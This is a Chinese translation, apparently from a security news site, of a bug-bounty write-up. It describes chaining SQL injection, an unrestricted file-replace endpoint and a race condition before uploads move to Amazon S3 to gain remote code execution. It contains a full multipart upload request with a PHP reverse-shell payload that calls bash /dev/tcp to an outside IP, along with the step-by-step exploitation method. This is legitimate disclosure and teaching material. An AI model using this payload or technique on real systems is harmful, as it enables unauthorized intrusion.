***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径**

![](https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg!small)

 **本文讲述了作者在某邀请测试项目中，通过对SQL注入和竞争条件（Race
Condition）的组合利用，利用上传文件到服务器和服务器转移上传文件到Amazon
S3的时间差，最终实现了对目标应用的RCE漏洞。由于该RCE漏洞的发现相对独特，所以作者在本文中着重从竞争条件（Race
Condition）的触发机制说起，和大家分享。**

竞争条件（Race
Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race
Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。

## 漏洞详情

### 第一个上传功能点upload.php

这里的前提是，我已经通过SQL注入获取到了目标Web应用的管理员账户凭据，然后登录到其内部管理界面后，我发现可通过该管理面板中的upload.php功能发布新闻或文章：

![](https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png!small)

没做太多考虑，我就直接通过upload.php尝试上传了一个.php文件shell，但问题是该上传功能限制了对.php格式文件的上传，在变化.PhP、.php3、phpphp、空字符等形式的绕过方法后，还是不行：

![](https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png!small)

然后，我想到了存储型XSS，能不能通过上传
.html、.xml或.svg格式文件呢？这一下上传总算成功了，但是，由于目标Web应用又会把用户上传文件转储到云端的S3存储桶中去，那在S3存储桶触发XSS也没意义了。好吧，那暂时把这个问题放一边，来看其它的。

### 第二个上传功能点modify.php

在没有头绪之时，我又返回管理面板中“news”栏目，想看看能不能在添加或编辑操作中发现可利用的点。此时，我注意到了“edit”功能，如下在这个非法上传文件右上端，我点击了其“edit”按钮：

![](https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png!small)

然后跳出了以下包含upload to replacing the file的窗口：

![](https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png!small)

我想到的是，它可能也是包含了限制过滤条件吧，但事实是，它没有任何后缀格式限制条件！可以上传任意文件！那就上传吧，如果没有限制条件的话，那它调用的应该不是之前的upload.php，确实是，它调用了另一上传功能点“modify.php”，以下是它的调用请求格式：

    
    
    Content-Disposition: form-data; name="fileid"
    
    31337
    
    -----------------------------09234599689937136550676151776
    
    Content-Disposition: form-data; name="name"
    
    picture-1.png
    
    -----------------------------09234599689937136550676151776
    
    Content-Disposition: form-data; name="description"
    
    -----------------------------09234599689937136550676151776
    
    Content-Disposition: form-data; name="userfile"; filename="reverse.php"
    
    Content-Type: text/php
    
    <?php
    
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'");
    
    -----------------------------09234599689937136550676151776
    
    Content-Disposition: form-data; name="save"
    
    Save

大功告成了吗？并没有。目标Web应用之后还会把用户上传文件转储上传到云端S3存储桶中去，也就是说，如果被传到S3中去，在目标Web应用的服务器中，我们也没shell可反弹了。  

竞争条件（Race Condition）响应错误获得本地文件路径

此时，毫无头绪之际，我通过burpsuite的 intruder
模式上传操作中，发现了响应长度的异常。有时候需要发起10个左右的请求，有时候则需要发起20–30个请求，才会出现这样的响应异常。正常来说，多数请求的响应长度为1147，但奇怪的是，在其中，会夹杂着长度为1710的响应。如多次上传空内容的rc.php，其请求样式为：

![](https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png!small)

以下是正常的长度为1147的响应：

![图片1.png](https://image.3001.net/images/20190929/15697498189460.png!small)

以下则是异常的长度为1710的响应，其中竟然返回了我们上传的php文件的本地路径：

![图片2.png](https://image.3001.net/images/20190929/15697498457248.png!small)

本想着，有了这个路径，那么完全就可以实现监听反弹了，但其实不然。当我通过浏览器访问该上传php文件后，Web应用返回了“File not
Found”的提示，经再次检查后发现，该文件路径已经对应成了S3存储桶的路径了，所以，因此我猜测，我们的上传文件被目标Web应用移动到云端S3之前，在Web应用服务器中保存的时间大概会是短暂的1到2秒。

### 用竞争条件（Race Condition）反弹Shell并实现RCE

根据以上的时间猜测，我就有一个想法：如果我们从客户端来触发竞争条件，通过浏览器反复请求上传文件路径，以此来争取对其的访问占有权限，这样的做法是否可行？

也就是：

> 在我们shell反弹服务器中设置端口监听 -> 上传我们的反弹shell文件 -> 发起多个请求执行竞争条件 -> 获取长度异常的响应 ->
> 从中获取上传shell文件路径并用浏览器访问并不断刷新（CTRL+R） -> 以这种方式再次让目标Web应用处于竞争条件下,
> 我们就占有了对上传shell文件的继续访问权。

一试，果然行。以下是触发反弹shell实现RCE的竞争条件逻辑图：

![](https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png!small)

nc端监听返回的RCE结果：

![](https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png!small)

## 经验总结

在上传文件本身被转移到云端S3存储桶之前，我们有可能获得上传文件的本地路径。哪怕只有1或2秒，就足以触发上传shell的成功反弹；

可多对上传或编辑功能点进行分析，如果它们是独立的调用，那么则需要比较它们可具体实现的操作。

 ***参考来源：[medium](https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3)，clouds编译整理，转载请注明来自FreeBuf.COM **  

